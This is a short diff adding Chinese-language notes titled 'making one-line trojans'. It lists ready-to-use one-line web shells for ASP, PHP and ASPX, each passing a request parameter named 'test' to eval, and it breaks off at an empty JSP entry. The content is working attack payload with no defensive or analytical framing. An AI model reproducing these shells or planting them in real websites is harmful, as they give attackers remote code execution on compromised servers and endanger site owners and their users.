@@ -1,0 +1,9 @@
+一句话木马制作：
+  asp一句话木马：
+    <%eval request("test")%>
+  php一句话木马：
+    <?php @eval($_POST[test]);?>
+  aspx一句话木马：
+    <%@ Page Language="Jscript"%>  <%eval(Request.Item["test"])%>
+  jsp一句话木马：
+  
